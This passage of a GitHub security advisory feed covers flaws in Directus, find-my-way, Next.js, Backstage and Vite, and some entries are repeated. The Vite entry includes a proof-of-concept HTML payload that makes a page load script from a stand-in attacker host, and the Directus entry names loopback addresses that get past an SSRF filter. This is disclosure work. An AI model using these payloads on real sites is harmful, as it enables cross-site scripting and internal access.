        <title type="html"><![CDATA[[directus] Directus vulnerable to SSRF Loopback IP filter bypass]]></title>
        <id>https://github.com/advisories/GHSA-68g8-c275-xf2m</id>
        <link href="https://github.com/advisories/GHSA-68g8-c275-xf2m"/>
        <updated>2024-09-19T15:42:41.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>If you're relying on blocking access to localhost using the default <code>0.0.0.0</code> filter this can be bypassed using other registered loopback devices (like <code>127.0.0.2</code> - <code>127.127.127.127</code>)</p>
<h3 id="workaround">Workaround</h3>
<p>You can block this bypass by manually adding the <code>127.0.0.0/8</code> CIDR range which will block access to any <code>127.X.X.X</code> ip instead of just <code>127.0.0.1</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/directus/directus/security/advisories/GHSA-68g8-c275-xf2m">https://github.com/directus/directus/security/advisories/GHSA-68g8-c275-xf2m</a></li>
<li><a href="https://github.com/directus/directus/commit/8cbf943b65fd4a763d09a5fdbba8996b1e7797ff">https://github.com/directus/directus/commit/8cbf943b65fd4a763d09a5fdbba8996b1e7797ff</a></li>
<li><a href="https://github.com/directus/directus/commit/c1f3ccc681595038d094ce110ddeee38cb38f431">https://github.com/directus/directus/commit/c1f3ccc681595038d094ce110ddeee38cb38f431</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-46990">https://nvd.nist.gov/vuln/detail/CVE-2024-46990</a></li>
<li><a href="https://github.com/directus/directus/commit/4aace0bbe57232e38cd6a287ee475293e46dc91b">https://github.com/directus/directus/commit/4aace0bbe57232e38cd6a287ee475293e46dc91b</a></li>
<li><a href="https://github.com/directus/directus/commit/769fa22797bff5a9231599883b391e013f122e52">https://github.com/directus/directus/commit/769fa22797bff5a9231599883b391e013f122e52</a></li>
<li><a href="https://github.com/advisories/GHSA-68g8-c275-xf2m">https://github.com/advisories/GHSA-68g8-c275-xf2m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-68g8-c275-xf2m</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-18T17:42:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[directus] Directus vulnerable to SSRF Loopback IP filter bypass]]></title>
        <id>https://github.com/advisories/GHSA-68g8-c275-xf2m</id>
        <link href="https://github.com/advisories/GHSA-68g8-c275-xf2m"/>
        <updated>2024-09-19T15:42:41.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>If you're relying on blocking access to localhost using the default <code>0.0.0.0</code> filter this can be bypassed using other registered loopback devices (like <code>127.0.0.2</code> - <code>127.127.127.127</code>)</p>
<h3 id="workaround">Workaround</h3>
<p>You can block this bypass by manually adding the <code>127.0.0.0/8</code> CIDR range which will block access to any <code>127.X.X.X</code> ip instead of just <code>127.0.0.1</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/directus/directus/security/advisories/GHSA-68g8-c275-xf2m">https://github.com/directus/directus/security/advisories/GHSA-68g8-c275-xf2m</a></li>
<li><a href="https://github.com/directus/directus/commit/8cbf943b65fd4a763d09a5fdbba8996b1e7797ff">https://github.com/directus/directus/commit/8cbf943b65fd4a763d09a5fdbba8996b1e7797ff</a></li>
<li><a href="https://github.com/directus/directus/commit/c1f3ccc681595038d094ce110ddeee38cb38f431">https://github.com/directus/directus/commit/c1f3ccc681595038d094ce110ddeee38cb38f431</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-46990">https://nvd.nist.gov/vuln/detail/CVE-2024-46990</a></li>
<li><a href="https://github.com/directus/directus/commit/4aace0bbe57232e38cd6a287ee475293e46dc91b">https://github.com/directus/directus/commit/4aace0bbe57232e38cd6a287ee475293e46dc91b</a></li>
<li><a href="https://github.com/directus/directus/commit/769fa22797bff5a9231599883b391e013f122e52">https://github.com/directus/directus/commit/769fa22797bff5a9231599883b391e013f122e52</a></li>
<li><a href="https://github.com/advisories/GHSA-68g8-c275-xf2m">https://github.com/advisories/GHSA-68g8-c275-xf2m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-68g8-c275-xf2m</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-18T17:42:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[find-my-way] find-my-way has a ReDoS vulnerability in multiparametric routes]]></title>
        <id>https://github.com/advisories/GHSA-rrr8-f88r-h8q6</id>
        <link href="https://github.com/advisories/GHSA-rrr8-f88r-h8q6"/>
        <updated>2024-09-18T19:22:56.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A bad regular expression is generated any time you have two parameters within a single segment, when adding a <code>-</code> at the end, like <code>/:a-:b-</code>.</p>
<h3 id="patches">Patches</h3>
<p>Update to find-my-way v8.2.2 or v9.0.1. or subsequent versions.</p>
<h3 id="workarounds">Workarounds</h3>
<p>No known workarounds.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/advisories/GHSA-9wv6-86v2-598j">CVE-2024-45296</a></li>
<li><a href="https://blakeembrey.com/posts/2024-09-web-redos/">Detailed blog post about <code>path-to-regexp</code> vulnerability</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/delvedor/find-my-way/security/advisories/GHSA-rrr8-f88r-h8q6">https://github.com/delvedor/find-my-way/security/advisories/GHSA-rrr8-f88r-h8q6</a></li>
<li><a href="https://github.com/delvedor/find-my-way/commit/17fae694dcefc056045da201681c1530f0f80518">https://github.com/delvedor/find-my-way/commit/17fae694dcefc056045da201681c1530f0f80518</a></li>
<li><a href="https://github.com/delvedor/find-my-way/commit/5e9e0eb5d8d438e06a185d5e536a896572dd0440">https://github.com/delvedor/find-my-way/commit/5e9e0eb5d8d438e06a185d5e536a896572dd0440</a></li>
<li><a href="https://blakeembrey.com/posts/2024-09-web-redos">https://blakeembrey.com/posts/2024-09-web-redos</a></li>
<li><a href="https://github.com/advisories/GHSA-9wv6-86v2-598j">https://github.com/advisories/GHSA-9wv6-86v2-598j</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45813">https://nvd.nist.gov/vuln/detail/CVE-2024-45813</a></li>
<li><a href="https://github.com/advisories/GHSA-rrr8-f88r-h8q6">https://github.com/advisories/GHSA-rrr8-f88r-h8q6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rrr8-f88r-h8q6</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-09-18T15:52:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[find-my-way] find-my-way has a ReDoS vulnerability in multiparametric routes]]></title>
        <id>https://github.com/advisories/GHSA-rrr8-f88r-h8q6</id>
        <link href="https://github.com/advisories/GHSA-rrr8-f88r-h8q6"/>
        <updated>2024-09-18T19:22:56.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A bad regular expression is generated any time you have two parameters within a single segment, when adding a <code>-</code> at the end, like <code>/:a-:b-</code>.</p>
<h3 id="patches">Patches</h3>
<p>Update to find-my-way v8.2.2 or v9.0.1. or subsequent versions.</p>
<h3 id="workarounds">Workarounds</h3>
<p>No known workarounds.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/advisories/GHSA-9wv6-86v2-598j">CVE-2024-45296</a></li>
<li><a href="https://blakeembrey.com/posts/2024-09-web-redos/">Detailed blog post about <code>path-to-regexp</code> vulnerability</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/delvedor/find-my-way/security/advisories/GHSA-rrr8-f88r-h8q6">https://github.com/delvedor/find-my-way/security/advisories/GHSA-rrr8-f88r-h8q6</a></li>
<li><a href="https://github.com/delvedor/find-my-way/commit/17fae694dcefc056045da201681c1530f0f80518">https://github.com/delvedor/find-my-way/commit/17fae694dcefc056045da201681c1530f0f80518</a></li>
<li><a href="https://github.com/delvedor/find-my-way/commit/5e9e0eb5d8d438e06a185d5e536a896572dd0440">https://github.com/delvedor/find-my-way/commit/5e9e0eb5d8d438e06a185d5e536a896572dd0440</a></li>
<li><a href="https://blakeembrey.com/posts/2024-09-web-redos">https://blakeembrey.com/posts/2024-09-web-redos</a></li>
<li><a href="https://github.com/advisories/GHSA-9wv6-86v2-598j">https://github.com/advisories/GHSA-9wv6-86v2-598j</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45813">https://nvd.nist.gov/vuln/detail/CVE-2024-45813</a></li>
<li><a href="https://github.com/advisories/GHSA-rrr8-f88r-h8q6">https://github.com/advisories/GHSA-rrr8-f88r-h8q6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rrr8-f88r-h8q6</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-09-18T15:52:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[next] Next.js Cache Poisoning]]></title>
        <id>https://github.com/advisories/GHSA-gp8f-8m3g-qvj9</id>
        <link href="https://github.com/advisories/GHSA-gp8f-8m3g-qvj9"/>
        <updated>2024-09-18T14:28:58.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>By sending a crafted HTTP request, it is possible to poison the cache of a non-dynamic server-side rendered route in the pages router (this does not affect the app router). When this crafted request is sent it could coerce Next.js to cache a route that is meant to not be cached and send a <code>Cache-Control: s-maxage=1, stale-while-revalidate</code> header which some upstream CDNs may cache as well. </p>
<p>To be potentially affected all of the following must apply: </p>
<ul>
<li>Next.js between 13.5.1 and 14.2.9</li>
<li>Using pages router</li>
<li>Using non-dynamic server-side rendered routes e.g. <code>pages/dashboard.tsx</code> not <code>pages/blog/[slug].tsx</code></li>
</ul>
<p>The below configurations are unaffected:</p>
<ul>
<li>Deployments using only app router</li>
<li>Deployments on <a href="https://vercel.com/">Vercel</a> are not affected</li>
</ul>
<h3 id="patches">Patches</h3>
<p>This vulnerability was resolved in Next.js v13.5.7, v14.2.10, and later. We recommend upgrading regardless of whether you can reproduce the issue or not.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There are no official or recommended workarounds for this issue, we recommend that users patch to a safe version.</p>
<h4 id="credits">Credits</h4>
<ul>
<li>Allam Rachid (zhero_)</li>
<li>Henry Chen</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vercel/next.js/security/advisories/GHSA-gp8f-8m3g-qvj9">https://github.com/vercel/next.js/security/advisories/GHSA-gp8f-8m3g-qvj9</a></li>
<li><a href="https://github.com/vercel/next.js/commit/7ed7f125e07ef0517a331009ed7e32691ba403d3">https://github.com/vercel/next.js/commit/7ed7f125e07ef0517a331009ed7e32691ba403d3</a></li>
<li><a href="https://github.com/vercel/next.js/commit/bd164d53af259c05f1ab434004bcfdd3837d7cda">https://github.com/vercel/next.js/commit/bd164d53af259c05f1ab434004bcfdd3837d7cda</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-46982">https://nvd.nist.gov/vuln/detail/CVE-2024-46982</a></li>
<li><a href="https://github.com/advisories/GHSA-gp8f-8m3g-qvj9">https://github.com/advisories/GHSA-gp8f-8m3g-qvj9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gp8f-8m3g-qvj9</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-09-17T21:58:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[next] Next.js Cache Poisoning]]></title>
        <id>https://github.com/advisories/GHSA-gp8f-8m3g-qvj9</id>
        <link href="https://github.com/advisories/GHSA-gp8f-8m3g-qvj9"/>
        <updated>2024-09-18T14:28:58.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>By sending a crafted HTTP request, it is possible to poison the cache of a non-dynamic server-side rendered route in the pages router (this does not affect the app router). When this crafted request is sent it could coerce Next.js to cache a route that is meant to not be cached and send a <code>Cache-Control: s-maxage=1, stale-while-revalidate</code> header which some upstream CDNs may cache as well. </p>
<p>To be potentially affected all of the following must apply: </p>
<ul>
<li>Next.js between 13.5.1 and 14.2.9</li>
<li>Using pages router</li>
<li>Using non-dynamic server-side rendered routes e.g. <code>pages/dashboard.tsx</code> not <code>pages/blog/[slug].tsx</code></li>
</ul>
<p>The below configurations are unaffected:</p>
<ul>
<li>Deployments using only app router</li>
<li>Deployments on <a href="https://vercel.com/">Vercel</a> are not affected</li>
</ul>
<h3 id="patches">Patches</h3>
<p>This vulnerability was resolved in Next.js v13.5.7, v14.2.10, and later. We recommend upgrading regardless of whether you can reproduce the issue or not.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There are no official or recommended workarounds for this issue, we recommend that users patch to a safe version.</p>
<h4 id="credits">Credits</h4>
<ul>
<li>Allam Rachid (zhero_)</li>
<li>Henry Chen</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vercel/next.js/security/advisories/GHSA-gp8f-8m3g-qvj9">https://github.com/vercel/next.js/security/advisories/GHSA-gp8f-8m3g-qvj9</a></li>
<li><a href="https://github.com/vercel/next.js/commit/7ed7f125e07ef0517a331009ed7e32691ba403d3">https://github.com/vercel/next.js/commit/7ed7f125e07ef0517a331009ed7e32691ba403d3</a></li>
<li><a href="https://github.com/vercel/next.js/commit/bd164d53af259c05f1ab434004bcfdd3837d7cda">https://github.com/vercel/next.js/commit/bd164d53af259c05f1ab434004bcfdd3837d7cda</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-46982">https://nvd.nist.gov/vuln/detail/CVE-2024-46982</a></li>
<li><a href="https://github.com/advisories/GHSA-gp8f-8m3g-qvj9">https://github.com/advisories/GHSA-gp8f-8m3g-qvj9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gp8f-8m3g-qvj9</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-09-17T21:58:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@backstage/plugin-techdocs-backend] @backstage/plugin-techdocs-backend vulnerable to circumvention of cross site scripting protection]]></title>
        <id>https://github.com/advisories/GHSA-5j94-f3mf-8685</id>
        <link href="https://github.com/advisories/GHSA-5j94-f3mf-8685"/>
        <updated>2024-09-17T21:31:29.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>An attacker with control of the contents of the TechDocs storage buckets is able to inject executable scripts in the TechDocs content that will be executed in the victim's browser when browsing documentation or navigating to an attacker provided link.</p>
<h3 id="patches">Patches</h3>
<p>This has been fixed in the 1.10.13 release of the <code>@backstage/plugin-techdocs-backend</code> package.</p>
<h3 id="references">References</h3>
<p>If you have any questions or comments about this advisory:</p>
<p>Open an issue in the <a href="https://github.com/backstage/backstage">Backstage repository</a>
Visit our Discord, linked to in <a href="https://github.com/backstage/backstage">Backstage README</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/backstage/backstage/security/advisories/GHSA-5j94-f3mf-8685">https://github.com/backstage/backstage/security/advisories/GHSA-5j94-f3mf-8685</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-46976">https://nvd.nist.gov/vuln/detail/CVE-2024-46976</a></li>
<li><a href="https://github.com/advisories/GHSA-5j94-f3mf-8685">https://github.com/advisories/GHSA-5j94-f3mf-8685</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5j94-f3mf-8685</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-17T21:31:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@backstage/plugin-techdocs-backend] @backstage/plugin-techdocs-backend storage bucket Directory Traversal vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-39v3-f278-vj3g</id>
        <link href="https://github.com/advisories/GHSA-39v3-f278-vj3g"/>
        <updated>2024-09-17T22:29:20.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>When using the AWS S3 or GCS storage provider for TechDocs it is possible to access content in the entire storage bucket. This can leak contents of the bucket that are not intended to be accessible, as well as bypass permission checks in Backstage.</p>
<h3 id="patches">Patches</h3>
<p>This has been fixed in the 1.10.13 release of the <code>@backstage/plugin-techdocs-backend</code> package.</p>
<h3 id="references">References</h3>
<p>If you have any questions or comments about this advisory:</p>
<p>Open an issue in the <a href="https://github.com/backstage/backstage">Backstage repository</a>
Visit our Discord, linked to in <a href="https://github.com/backstage/backstage">Backstage README</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/backstage/backstage/security/advisories/GHSA-39v3-f278-vj3g">https://github.com/backstage/backstage/security/advisories/GHSA-39v3-f278-vj3g</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45816">https://nvd.nist.gov/vuln/detail/CVE-2024-45816</a></li>
<li><a href="https://github.com/advisories/GHSA-39v3-f278-vj3g">https://github.com/advisories/GHSA-39v3-f278-vj3g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-39v3-f278-vj3g</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-17T21:30:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@backstage/plugin-catalog-backend] @backstage/plugin-catalog-backend Prototype Pollution vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-3x3f-jcp3-g22j</id>
        <link href="https://github.com/advisories/GHSA-3x3f-jcp3-g22j"/>
        <updated>2024-09-17T22:29:10.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A malicious actor with authenticated access to a Backstage instance with the catalog backend plugin installed is able to interrupt the service using a specially crafted query to the catalog API.</p>
<h3 id="patches">Patches</h3>
<p>This has been fixed in the <code>1.26.0</code> release of the <code>@backstage/plugin-catalog-backend</code> package.</p>
<h3 id="references">References</h3>
<p>If you have any questions or comments about this advisory:</p>
<p>Open an issue in the <a href="https://github.com/backstage/backstage">Backstage repository</a>
Visit our Discord, linked to in <a href="https://github.com/backstage/backstage">Backstage README</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/backstage/backstage/security/advisories/GHSA-3x3f-jcp3-g22j">https://github.com/backstage/backstage/security/advisories/GHSA-3x3f-jcp3-g22j</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45815">https://nvd.nist.gov/vuln/detail/CVE-2024-45815</a></li>
<li><a href="https://github.com/advisories/GHSA-3x3f-jcp3-g22j">https://github.com/advisories/GHSA-3x3f-jcp3-g22j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3x3f-jcp3-g22j</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-17T21:29:49.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vite] Vite DOM Clobbering gadget found in vite bundled scripts that leads to XSS]]></title>
        <id>https://github.com/advisories/GHSA-64vr-g452-qvp3</id>
        <link href="https://github.com/advisories/GHSA-64vr-g452-qvp3"/>
        <updated>2024-09-19T18:33:22.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>We discovered a DOM Clobbering vulnerability in Vite when building scripts to <code>cjs</code>/<code>iife</code>/<code>umd</code> output format. The DOM Clobbering gadget in the module can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an img tag with an unsanitized name attribute) are present.</p>
<p>Note that, we have identified similar security issues in Webpack: <a href="https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986">https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986</a></p>
<h3 id="details">Details</h3>
<p><strong>Backgrounds</strong></p>
<p>DOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:</p>
<p>[1] <a href="https://scnps.co/papers/sp23_domclob.pdf">https://scnps.co/papers/sp23_domclob.pdf</a>
[2] <a href="https://research.securitum.com/xss-in-amp4email-dom-clobbering/">https://research.securitum.com/xss-in-amp4email-dom-clobbering/</a></p>
<p><strong>Gadgets found in Vite</strong></p>
<p>We have identified a DOM Clobbering vulnerability in Vite bundled scripts, particularly when the scripts dynamically import other scripts from the assets folder and the developer sets the build output format to <code>cjs</code>, <code>iife</code>, or <code>umd</code>. In such cases, Vite replaces relative paths starting with <code>__VITE_ASSET__</code> using the URL retrieved from <code>document.currentScript</code>.</p>
<p>However, this implementation is vulnerable to a DOM Clobbering attack. The <code>document.currentScript</code> lookup can be shadowed by an attacker via the browser's named DOM tree element access mechanism. This manipulation allows an attacker to replace the intended script element with a malicious HTML element. When this happens, the src attribute of the attacker-controlled element is used as the URL for importing scripts, potentially leading to the dynamic loading of scripts from an attacker-controlled server.</p>
<pre><code>const relativeUrlMechanisms = {
  amd: (relativePath) =&gt; {
    if (relativePath[0] !== ".") relativePath = "./" + relativePath;
    return getResolveUrl(
      `require.toUrl('${escapeId(relativePath)}'), document.baseURI`
    );
  },
  cjs: (relativePath) =&gt; `(typeof document === 'undefined' ? ${getFileUrlFromRelativePath(
    relativePath
  )} : ${getRelativeUrlFromDocument(relativePath)})`,
  es: (relativePath) =&gt; getResolveUrl(
    `'${escapeId(partialEncodeURIPath(relativePath))}', import.meta.url`
  ),
  iife: (relativePath) =&gt; getRelativeUrlFromDocument(relativePath),
  // NOTE: make sure rollup generate `module` params
  system: (relativePath) =&gt; getResolveUrl(
    `'${escapeId(partialEncodeURIPath(relativePath))}', module.meta.url`
  ),
  umd: (relativePath) =&gt; `(typeof document === 'undefined' &amp;&amp; typeof location === 'undefined' ? ${getFileUrlFromRelativePath(
    relativePath
  )} : ${getRelativeUrlFromDocument(relativePath, true)})`
};
</code></pre>
<h3 id="poc">PoC</h3>
<p>Considering a website that contains the following <code>main.js</code> script, the devloper decides to use the Vite to bundle up the program with the following configuration. </p>
<pre><code>// main.js
import extraURL from './extra.js?url'
var s = document.createElement('script')
s.src = extraURL
document.head.append(s)
</code></pre>
<pre><code>// extra.js
export default "https://myserver/justAnOther.js"
</code></pre>
<pre><code>// vite.config.js
import { defineConfig } from 'vite'

export default defineConfig({
  build: {
    assetsInlineLimit: 0, // To avoid inline assets for PoC
    rollupOptions: {
      output: {
        format: "cjs"
      },
    },
  },
  base: "./",
});
</code></pre>
<p>After running the build command, the developer will get following bundle as the output.</p>
<pre><code>// dist/index-DDmIg9VD.js
"use strict";const t=""+(typeof document&gt;"u"?require("url").pathToFileURL(__dirname+"/extra-BLVEx9Lb.js").href:new URL("extra-BLVEx9Lb.js",document.currentScript&amp;&amp;document.currentScript.src||document.baseURI).href);var e=document.createElement("script");e.src=t;document.head.append(e);
</code></pre>
<p>Adding the Vite bundled script, <code>dist/index-DDmIg9VD.js</code>, as part of the web page source code, the page could load the <code>extra.js</code> file from the attacker's domain, <code>attacker.controlled.server</code>. The attacker only needs to insert an <code>img</code> tag with the <code>name</code> attribute set to <code>currentScript</code>. This can be done through a website's feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.</p>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
  &lt;title&gt;Vite Example&lt;/title&gt;
  &lt;!-- Attacker-controlled Script-less HTML Element starts--!&gt;
  &lt;img name="currentScript" src="https://attacker.controlled.server/"&gt;&lt;/img&gt;
  &lt;!-- Attacker-controlled Script-less HTML Element ends--!&gt;
&lt;/head&gt;
&lt;script type="module" crossorigin src="/assets/index-DDmIg9VD.js"&gt;&lt;/script&gt;
&lt;body&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h3 id="impact">Impact</h3>
<p>This vulnerability can result in cross-site scripting (XSS) attacks on websites that include Vite-bundled files (configured with an output format of <code>cjs</code>, <code>iife</code>, or <code>umd</code>) and allow users to inject certain scriptless HTML tags without properly sanitizing the name or id attributes.</p>
<h3 id="patch">Patch</h3>
<pre><code>// https://github.com/vitejs/vite/blob/main/packages/vite/src/node/build.ts#L1296
const getRelativeUrlFromDocument = (relativePath: string, umd = false) =&gt;
  getResolveUrl(
    `'${escapeId(partialEncodeURIPath(relativePath))}', ${
      umd ? `typeof document === 'undefined' ? location.href : ` : ''
    }document.currentScript &amp;&amp; document.currentScript.tagName.toUpperCase() === 'SCRIPT' &amp;&amp; document.currentScript.src || document.baseURI`,
  )
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vitejs/vite/security/advisories/GHSA-64vr-g452-qvp3">https://github.com/vitejs/vite/security/advisories/GHSA-64vr-g452-qvp3</a></li>
<li><a href="https://github.com/vitejs/vite/commit/179b17773cf35c73ddb041f9e6c703fd9f3126af">https://github.com/vitejs/vite/commit/179b17773cf35c73ddb041f9e6c703fd9f3126af</a></li>
<li><a href="https://github.com/vitejs/vite/commit/2691bb3ff6b073b41fb9046909e1e03a74e36675">https://github.com/vitejs/vite/commit/2691bb3ff6b073b41fb9046909e1e03a74e36675</a></li>
<li><a href="https://github.com/vitejs/vite/commit/2ddd8541ec3b2d2e5b698749e0f2362ef28056bd">https://github.com/vitejs/vite/commit/2ddd8541ec3b2d2e5b698749e0f2362ef28056bd</a></li>
<li><a href="https://github.com/vitejs/vite/commit/e8127166979e7ace6eeaa2c3b733c8994caa31f3">https://github.com/vitejs/vite/commit/e8127166979e7ace6eeaa2c3b733c8994caa31f3</a></li>
<li><a href="https://github.com/vitejs/vite/commit/ebb94c5b3bf41950f45562595adec117a4d0ba5e">https://github.com/vitejs/vite/commit/ebb94c5b3bf41950f45562595adec117a4d0ba5e</a></li>
<li><a href="https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986">https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45812">https://nvd.nist.gov/vuln/detail/CVE-2024-45812</a></li>
<li><a href="https://github.com/vitejs/vite/commit/ade1d89660e17eedfd35652165b0c26905259fad">https://github.com/vitejs/vite/commit/ade1d89660e17eedfd35652165b0c26905259fad</a></li>
<li><a href="https://research.securitum.com/xss-in-amp4email-dom-clobbering">https://research.securitum.com/xss-in-amp4email-dom-clobbering</a></li>
<li><a href="https://scnps.co/papers/sp23_domclob.pdf">https://scnps.co/papers/sp23_domclob.pdf</a></li>
<li><a href="https://github.com/advisories/GHSA-64vr-g452-qvp3">https://github.com/advisories/GHSA-64vr-g452-qvp3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-64vr-g452-qvp3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-17T19:28:01.000Z</published>
    </entry>
</feed>